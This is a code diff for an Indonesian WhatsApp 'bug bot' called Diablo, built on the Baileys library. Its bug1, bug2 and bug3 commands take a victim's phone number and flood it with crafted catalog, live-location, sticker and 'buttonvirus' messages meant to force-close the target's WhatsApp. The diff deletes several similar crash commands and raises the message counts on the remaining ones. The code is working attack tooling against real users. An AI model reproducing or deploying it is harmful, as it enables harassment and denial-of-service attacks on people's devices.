@@ -230,29 +230,20 @@ jiren = `
 亗├ 𝙡𝙞𝙗 : baileys
 亗├ 𝙗𝙤𝙩 𝙣𝙖𝙢𝙚 : Diablo
 亗├──────────────────┈
-亗├ 「𝘽𝙐𝙂 𝙈𝙀𝙉𝙐」
+亗├ 「𝙎𝙄𝙈𝙋𝙇𝙀 𝘽𝙐𝙂 𝘽𝙊𝙏」
 亗├──────────────────┈
 亗├ • ${prefix}bug1 (62xxx)
 亗├ • ${prefix}bug2 (62xxx)
 亗├ • ${prefix}bug3 (62xxx)
+亗├ NOTE : 
+亗├ 62XXX ITU PASTE NO KORBAN
+亗├ contoh : bug1 62826578172
 亗├──────────────────┈
-亗├ 「𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 𝙑2」
-亗├ NOTE : wajib pakai wa immune
+亗├ 「𝙊𝙏𝙃𝙀𝙍」
 亗├──────────────────┈
-亗├ • ${prefix}bugvn
-亗├ • ${prefix}bugtext
-亗├ • ${prefix}buglog
-亗├ • ${prefix}bugloc
-亗├ • ${prefix}bugkontak
-亗├ • ${prefix}bugstick
-亗├ • ${prefix}bugitem
-亗├ • ${prefix}tag (text)
+亗├ • ${prefix}stats ( untuk cek status )
+亗├ • ${prefix}restart ( untuk restart )
 亗├──────────────────┈
-亗├ 「𝙒𝘼𝙍 𝙈𝙊𝘿𝙀」
-亗├ NOTE : wajib pakai wa immune
-亗├──────────────────┈
-亗├ • ${prefix}turu 
-亗├─────────────────┈ 
 `
 diablobotwhatsapp.reply(jiren)
 break
@@ -315,237 +306,12 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
 diablobotwhatsapp.reply(respon)
 }
 break
-case 'turu':{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '2'
-waktu = '2s'
-for (let i = 0; i < jumlah; i++) {
-diablo.sendMessage(from, { audio: audionye, mimetype: 'audio/mp4', ptt:true, mentions:[diablobotwhatsapp.sender]}, { quoted: lep })
-await sleep(ms(waktu))
-}
-
-}
-{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '2'
-waktu = '2s'
-for (let i = 0; i < jumlah; i++) {
-diablo.sendMessage(from, {text: "ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE"},{ quoted: lep })
-await sleep(ms(waktu))
-}
-
-}
-{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '2'
-waktu = '2s'
-for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
-var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
-"productMessage": {
-"product": {
-"productImage": messa.imageMessage,
-"productId": "7091718154232528",
-"title": `ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE`,
-"description": `${buttonvirus}${buttonvirus}`,
-"currencyCode": "IDR",
-"priceAmount1000": "100000000000000000",
-"productImageCount": 1,
-"firstImageId": 1,
-"salePriceAmount1000": "1000",
-"retailerId": `FC YA CHUAKS`,
-"url": `https://wa.me/0`
-},
-"businessOwnerJid": "6287705048235@s.whatsapp.net",
-}
-}), { userJid: from, quoted: lep  })
-diablo.relayMessage(from, catalog.message, { messageId: catalog.key.id })
-await sleep(ms(waktu))
-}
-
-}
-{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '2'
-waktu = '2s'
-for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
-var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
-"liveLocationMessage": {
-"degreesLatitude": -6.9367014,
-"degreesLongitude": 107.7228574,
-"name": "XNXX.COM`",
-"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
-"caption": "ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE",
-"sequenceNumber": "1657237469254001",
-"jpegThumbnail": messa.imageMessage,
-"mtype": "locationMessage"
-}
-}), { userJid: from, quoted: lep })
-diablo.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
-await sleep(ms(waktu))
-}
-
-}
-{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '2'
-waktu = '2s'
-for (let i = 0; i < jumlah; i++) {
-diablo.sendContact(from, owner, lep)
-await sleep(ms(waktu))
-}
-
-}
-{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '2'
-waktu = '2s'
-for (let i = 0; i < jumlah; i++) {
-sendBugcrash(from, 'ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
-await sleep(ms(waktu))
-}
-
-}
-{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '2'
-waktu = '2s'
-for (let i = 0; i < jumlah; i++) {
-diablo.sendMessage(from, {sticker: ppnyauser},{ quoted: lep })
-await sleep(ms(waktu))
-}
-diablobotwhatsapp.reply(`SUCCES`)
-}
-break
-case 'tag':{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-diablo.sendMessage(diablobotwhatsapp.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: lep })
-}
-break
-case 'bugvn':{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '3'
-waktu = '3s'
-for (let i = 0; i < jumlah; i++) {
-diablo.sendMessage(from, { audio: audionye, mimetype: 'audio/mp4', ptt:true, mentions:[diablobotwhatsapp.sender]}, { quoted: lep })
-await sleep(ms(waktu))
-}
-diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
-}
-break
-case 'bugtext':{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '3'
-waktu = '3s'
-for (let i = 0; i < jumlah; i++) {
-diablo.sendMessage(from, {text: "ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE"},{ quoted: lep })
-await sleep(ms(waktu))
-}
-diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
-}
-break
-case 'buglog':{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '3'
-waktu = '3s'
-for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
-var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
-"productMessage": {
-"product": {
-"productImage": messa.imageMessage,
-"productId": "7091718154232528",
-"title": `ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE`,
-"description": `${buttonvirus}${buttonvirus}`,
-"currencyCode": "IDR",
-"priceAmount1000": "100000000000000000",
-"productImageCount": 1,
-"firstImageId": 1,
-"salePriceAmount1000": "1000",
-"retailerId": `FC YA CHUAKS`,
-"url": `https://wa.me/0`
-},
-"businessOwnerJid": "6287705048235@s.whatsapp.net",
-}
-}), { userJid: from, quoted: lep  })
-diablo.relayMessage(from, catalog.message, { messageId: catalog.key.id })
-await sleep(ms(waktu))
-}
-diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
-}
-break
-case 'bugloc':{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '3'
-waktu = '3s'
-for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
-var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
-"liveLocationMessage": {
-"degreesLatitude": -6.9367014,
-"degreesLongitude": 107.7228574,
-"name": "XNXX.COM`",
-"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
-"caption": "ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE",
-"sequenceNumber": "1657237469254001",
-"jpegThumbnail": messa.imageMessage,
-"mtype": "locationMessage"
-}
-}), { userJid: from, quoted: lep })
-diablo.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
-await sleep(ms(waktu))
-}
-diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
-}
-break
-case 'bugkontak':{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '3'
-waktu = '3s'
-for (let i = 0; i < jumlah; i++) {
-diablo.sendContact(from, owner, lep)
-await sleep(ms(waktu))
-}
-diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
-}
-break
-case 'bugitem':{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '3'
-waktu = '3s'
-for (let i = 0; i < jumlah; i++) {
-sendBugcrash(from, 'ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
-await sleep(ms(waktu))
-}
-diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
-}
-break
-case 'bugstick':{
-if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
-jumlah = '3'
-waktu = '3s'
-for (let i = 0; i < jumlah; i++) {
-diablo.sendMessage(from, {sticker: ppnyauser},{ quoted: lep })
-await sleep(ms(waktu))
-}
-diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
-}
-break
-case 'sc':
-diablobotwhatsapp.reply("SC TIDAK DI JUAL!!! tapi klo mau akses bot hub wa.me/6281220670449 harga terjangkau loo")
-break
-case 'cewek': case 'cecan': {
-var yeye = await fetchJson("https://kirbotz-api.herokuapp.com/api/random/cecan?apikey=KirBotz") 
-diablo.sendMessage(from,{image:{url:yeye.result.url},caption: `${mess.succes}`}, { quoted: diablobotwhatsapp } )
-}
-break
 case 'bug3':{
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '3'
-waktu = '3s'
+jumlah = '5'
+waktu = '5s'
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
 await sleep(ms(waktu))
@@ -557,8 +323,8 @@ case 'bug2': {
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '3'
-waktu = '3s'
+jumlah = '5'
+waktu = '5s'
 for (let i = 0; i < jumlah; i++) {
 sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(ms(waktu))
@@ -570,8 +336,8 @@ case 'bug1': {
 if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '3'
-waktu = '3s'
+jumlah = '5'
+waktu = '5s'
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
 var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
